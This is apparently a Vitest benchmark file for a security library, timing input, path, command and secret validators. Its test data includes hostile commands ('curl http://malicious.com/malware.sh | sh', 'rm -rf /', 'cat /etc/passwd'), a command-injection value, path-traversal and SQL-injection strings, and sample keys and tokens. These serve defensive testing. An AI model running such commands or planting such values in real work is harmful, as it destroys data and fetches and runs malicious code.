/**
 * Security Package Integration Benchmarks
 *
 * Performance tests for real-world integration patterns
 * Demonstrates security package in realistic scenarios
 *
 * @module benchmarks/integration.bench
 */

import { describe, it, expect } from 'vitest';
import {
  InputValidator,
  PathValidator,
  SafeExecutor,
  SecretsSanitizer,
} from '../src/index.js';

describe('Integration Benchmarks - Real-World Scenarios', () => {
  describe('API Request Validation Pipeline', () => {
    const userSchema = InputValidator.object({
      email: InputValidator.string({ email: true, max: 254 }),
      name: InputValidator.string({ min: 1, max: 100 }),
      password: InputValidator.string({ min: 8, max: 128 }),
      phone: InputValidator.string({ max: 20 }).optional(),
    });

    it('should validate valid user registration in <5ms', () => {
      const validUser = {
        email: 'user@example.com',
        name: 'John Doe',
        password: 'SecurePassword123!',
      };

      const start = performance.now();
      const result = userSchema.safeParse(validUser);
      const end = performance.now();

      expect(result.success).toBe(true);
      expect(end - start).toBeLessThan(5);
    });

    it('should reject invalid email in <1ms', () => {
      const invalidUser = {
        email: 'not-an-email',
        name: 'John Doe',
        password: 'SecurePassword123!',
      };

      const start = performance.now();
      const result = userSchema.safeParse(invalidUser);
      const end = performance.now();

      expect(result.success).toBe(false);
      expect(end - start).toBeLessThan(1);
    });

    it('should reject short password in <1ms', () => {
      const invalidUser = {
        email: 'user@example.com',
        name: 'John Doe',
        password: 'short',
      };

      const start = performance.now();
      const result = userSchema.safeParse(invalidUser);
      const end = performance.now();

      expect(result.success).toBe(false);
      expect(end - start).toBeLessThan(1);
    });

    it('should handle batch validation (100 requests) in <100ms', () => {
      const users = Array.from({ length: 100 }, (_, i) => ({
        email: `user${i}@example.com`,
        name: `User ${i}`,
        password: `SecurePassword${i}!`,
      }));

      const start = performance.now();
      const results = users.map((user) => userSchema.safeParse(user));
      const end = performance.now();

      expect(results.every((r) => r.success)).toBe(true);
      expect(end - start).toBeLessThan(100);
    });
  });

  describe('File Operation Security', () => {
    it('should reject path traversal attempts in <1ms', () => {
      const maliciousPaths = [
        '../../etc/passwd',
        '../../../../../sensitive.txt',
        '..\\..\\windows\\system32',
        'subdir/../../config.env',
      ];

      const start = performance.now();

      for (const path of maliciousPaths) {
        try {
          PathValidator.validate(path, { allowTraversal: false });
          throw new Error('Should have rejected path traversal');
        } catch (error) {
          expect(error).toBeDefined();
        }
      }

      const end = performance.now();
      expect(end - start).toBeLessThan(1);
    });

    it('should allow safe relative paths in <1ms', () => {
      const safePaths = [
        './uploads/user/profile.jpg',
        'documents/report.pdf',
        'data/2024/january/data.csv',
      ];

      const start = performance.now();

      for (const path of safePaths) {
        try {
          PathValidator.validate(path, {
            allowTraversal: false,
            allowedDirectories: ['/app/data'],
          });
        } catch {
          // Expected for some paths
        }
      }

      const end = performance.now();
      expect(end - start).toBeLessThan(1);
    });
  });

  describe('Command Execution Security', () => {
    it('should allow safe commands in <1ms', () => {
      const safeCommands = [
        'npm install react',
        'git clone https://github.com/user/repo.git',
        'node app.js',
      ];

      const start = performance.now();

      for (const cmd of safeCommands) {
        try {
          SafeExecutor.validate(cmd, {
            allowedCommands: ['npm', 'git', 'node'],
          });
        } catch {
          // Some may fail based on command structure
        }
      }

      const end = performance.now();
      expect(end - start).toBeLessThan(1);
    });

    it('should reject dangerous commands in <1ms', () => {
      const dangerousCommands = [
        'rm -rf /',
        'mv /important /backup && rm -rf /important',
        'curl http://malicious.com/malware.sh | sh',
        'cat /etc/passwd',
      ];

      const start = performance.now();

      for (const cmd of dangerousCommands) {
        try {
          SafeExecutor.validate(cmd, {
            allowedCommands: ['npm', 'git', 'node'],
          });
          // Should fail validation
        } catch (error) {
          expect(error).toBeDefined();
        }
      }

      const end = performance.now();
      expect(end - start).toBeLessThan(1);
    });
  });

  describe('Secret Detection in Logs', () => {
    it('should detect secrets in application logs in <5ms', () => {
      const logEntries = [
        '[2024-01-26] User authenticated successfully',
        '[2024-01-26] API Key: AKIAIOSFODNN7EXAMPLE',
        '[2024-01-26] Database connection established',
        '[2024-01-26] Token: sk-ant-v123456789abcdefghijklmnopqrstuvwxyz123456789abcdefghijklmnopqrstuvwxyz123456789',
      ];

      const start = performance.now();

      for (const log of logEntries) {
        const findings = SecretsSanitizer.detect(log);
        // Some logs should have findings
      }

      const end = performance.now();
      expect(end - start).toBeLessThan(5);
    });

    it('should redact secrets in error messages in <5ms', () => {
      const errorMessage = `
        Failed to connect to database.
        Connection string: mongodb://user:password123@localhost:27017/db
        API Key: AKIAIOSFODNN7EXAMPLE
        JWT Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
      `;

      const start = performance.now();
      const redacted = SecretsSanitizer.redactContent(errorMessage);
      const end = performance.now();

      expect(redacted).not.toContain('AKIAIOSFODNN7EXAMPLE');
      expect(end - start).toBeLessThan(5);
    });
  });

  describe('Configuration Validation', () => {
    const configSchema = InputValidator.object({
      appName: InputValidator.string({ min: 1, max: 100 }),
      port: InputValidator.number({ min: 1024, max: 65535, int: true }),
      debug: InputValidator.boolean(),
      allowedOrigins: InputValidator.array(
        InputValidator.string({ url: true })
      ).optional(),
      maxConnections: InputValidator.number({ min: 1, max: 10000 })
        .optional(),
    });

    it('should validate valid configuration in <5ms', () => {
      const validConfig = {
        appName: 'MyApp',
        port: 3000,
        debug: false,
        allowedOrigins: ['https://example.com', 'https://app.example.com'],
        maxConnections: 100,
      };

      const start = performance.now();
      const result = configSchema.safeParse(validConfig);
      const end = performance.now();

      expect(result.success).toBe(true);
      expect(end - start).toBeLessThan(5);
    });

    it('should reject invalid port number in <1ms', () => {
      const invalidConfig = {
        appName: 'MyApp',
        port: 99999, // Out of valid range
        debug: false,
      };

      const start = performance.now();
      const result = configSchema.safeParse(invalidConfig);
      const end = performance.now();

      expect(result.success).toBe(false);
      expect(end - start).toBeLessThan(1);
    });

    it('should reject invalid origin URL in <1ms', () => {
      const invalidConfig = {
        appName: 'MyApp',
        port: 3000,
        debug: false,
        allowedOrigins: ['not-a-url'],
      };

      const start = performance.now();
      const result = configSchema.safeParse(invalidConfig);
      const end = performance.now();

      expect(result.success).toBe(false);
      expect(end - start).toBeLessThan(1);
    });
  });

  describe('Data Sanitization Pipeline', () => {
    it('should sanitize user input through multiple layers in <10ms', () => {
      const userInput = 'normal input with some special chars!@#$%';

      const start = performance.now();

      // Layer 1: Validate input
      const validationResult = InputValidator.string({
        min: 1,
        max: 1000,
      }).safeParse(userInput);

      if (!validationResult.success) {
        throw new Error('Validation failed');
      }

      // Layer 2: Check for secrets
      const findings = SecretsSanitizer.detect(validationResult.data);

      // Layer 3: Redact if needed
      const sanitized = SecretsSanitizer.redactContent(validationResult.data);

      const end = performance.now();

      expect(validationResult.success).toBe(true);
      expect(end - start).toBeLessThan(10);
    });

    it('should handle pathological input gracefully in <20ms', () => {
      // Very long input that could cause performance issues
      const pathologicalInput = 'x'.repeat(100000);

      const start = performance.now();

      const result = InputValidator.string({
        max: 100000,
      }).safeParse(pathologicalInput);

      const end = performance.now();

      expect(result.success).toBe(true);
      expect(end - start).toBeLessThan(20);
    });
  });

  describe('Defense-in-Depth Security', () => {
    it('should prevent SQL injection through multiple checks', () => {
      const sqlInjectionAttempt = "'; DROP TABLE users; --";

      // Layer 1: Length check
      const lengthCheck = InputValidator.string({
        max: 100,
      }).safeParse(sqlInjectionAttempt);

      expect(lengthCheck.success).toBe(true); // String is valid

      // Layer 2: Pattern detection would happen at database level
      // The string passes validation because it's syntactically valid

      // Real-world: Should use parameterized queries
    });

    it('should prevent command injection through SafeExecutor', () => {
      const commandInjectionAttempt = 'npm install; rm -rf /';

      try {
        SafeExecutor.validate(commandInjectionAttempt, {
          allowedCommands: ['npm'],
        });
        throw new Error('Should have rejected command injection');
      } catch (error) {
        expect(error).toBeDefined();
      }
    });

    it('should prevent path traversal through PathValidator', () => {
      const pathTraversalAttempt = '../../etc/passwd';

      try {
        PathValidator.validate(pathTraversalAttempt, {
          allowTraversal: false,
        });
        throw new Error('Should have rejected path traversal');
      } catch (error) {
        expect(error).toBeDefined();
      }
    });

    it('should detect and redact secrets in output', () => {
      const secretLogEntry = `
        User logged in.
        API Key used: AKIAIOSFODNN7EXAMPLE
      `;

      const redacted = SecretsSanitizer.redactContent(secretLogEntry);
      expect(redacted).not.toContain('AKIAIOSFODNN7EXAMPLE');
    });
  });

  describe('Performance Under Load', () => {
    it('should handle 1000 validations per second', () => {
      const schema = InputValidator.string({ email: true });
      const operations = 1000;

      const start = performance.now();

      for (let i = 0; i < operations; i++) {
        schema.safeParse(`user${i}@example.com`);
      }

      const end = performance.now();
      const totalMs = end - start;
      const opsPerSecond = (operations / totalMs) * 1000;

      console.log(`  ${opsPerSecond.toFixed(0)} validations/second`);
      expect(opsPerSecond).toBeGreaterThan(1000);
    });

    it('should maintain performance with 10000 operations', () => {
      const schema = InputValidator.object({
        email: InputValidator.string({ email: true }),
        name: InputValidator.string({ min: 1, max: 100 }),
      });

      const operations = 10000;
      const start = performance.now();

      for (let i = 0; i < operations; i++) {
        schema.safeParse({
          email: `user${i}@example.com`,
          name: `User ${i}`,
        });
      }

      const end = performance.now();
      const avgTime = (end - start) / operations;

      console.log(`  ${avgTime.toFixed(4)}ms average per operation`);
      expect(avgTime).toBeLessThan(1);
    });
  });

  describe('Real-World Scenarios', () => {
    it('should validate and sanitize API webhook payload', () => {
      const webhookSchema = InputValidator.object({
        event: InputValidator.string({
          regex: /^(user\.(created|updated|deleted)|payment\.(received|failed))$/,
        }),
        timestamp: InputValidator.number({ min: 0 }),
        data: InputValidator.object({
          id: InputValidator.string({ max: 100 }),
          email: InputValidator.string({ email: true }),
        }),
      });

      const payload = {
        event: 'user.created',
        timestamp: Date.now(),
        data: {
          id: 'user-123',
          email: 'new-user@example.com',
        },
      };

      const result = webhookSchema.safeParse(payload);
      expect(result.success).toBe(true);

      // Check for secrets in webhook data
      const findings = SecretsSanitizer.detect(JSON.stringify(payload));
      console.log(`  Webhook secrets found: ${findings.length}`);
    });

    it('should validate and sanitize form submission', () => {
      const formSchema = InputValidator.object({
        firstName: InputValidator.string({ min: 1, max: 50 }),
        lastName: InputValidator.string({ min: 1, max: 50 }),
        email: InputValidator.string({ email: true }),
        message: InputValidator.string({ min: 1, max: 5000 }),
        agree: InputValidator.boolean(),
      });

      const formData = {
        firstName: 'John',
        lastName: 'Doe',
        email: 'john.doe@example.com',
        message: 'I have a question about your service.',
        agree: true,
      };

      const result = formSchema.safeParse(formData);
      expect(result.success).toBe(true);

      // Redact for logging
      const redacted = SecretsSanitizer.redactContent(JSON.stringify(formData));
      console.log(`  Form submission sanitized for logging`);
    });

    it('should validate and sanitize environment configuration', () => {
      const envSchema = InputValidator.object({
        NODE_ENV: InputValidator.string({
          regex: /^(development|staging|production)$/,
        }),
        DATABASE_URL: InputValidator.string({ url: true }),
        LOG_LEVEL: InputValidator.string({
          regex: /^(debug|info|warn|error)$/,
        }),
        MAX_POOL_SIZE: InputValidator.number({ min: 1, max: 100 })
          .optional(),
      });

      const env = {
        NODE_ENV: 'production',
        DATABASE_URL: 'postgresql://host:5432/db',
        LOG_LEVEL: 'info',
        MAX_POOL_SIZE: 20,
      };

      const result = envSchema.safeParse(env);
      expect(result.success).toBe(true);

      // Redact database URL from logs
      const redacted = SecretsSanitizer.redactContent(JSON.stringify(env));
      console.log(`  Environment variables sanitized for logging`);
    });
  });

  describe('Performance Comparison', () => {
    it('should show performance improvement with validation caching', () => {
      const schema = InputValidator.string({ email: true });
      const email = 'test@example.com';

      // First validation (cold cache)
      const start1 = performance.now();
      schema.safeParse(email);
      const time1 = performance.now() - start1;

      // Subsequent validations (warm cache)
      let totalTime = 0;
      for (let i = 0; i < 100; i++) {
        const start = performance.now();
        schema.safeParse(email);
        totalTime += performance.now() - start;
      }
      const avgTime = totalTime / 100;

      console.log(`  Cold: ${time1.toFixed(4)}ms, Warm avg: ${avgTime.toFixed(4)}ms`);
      expect(avgTime).toBeLessThan(time1 * 2); // Should be fast
    });
  });
});
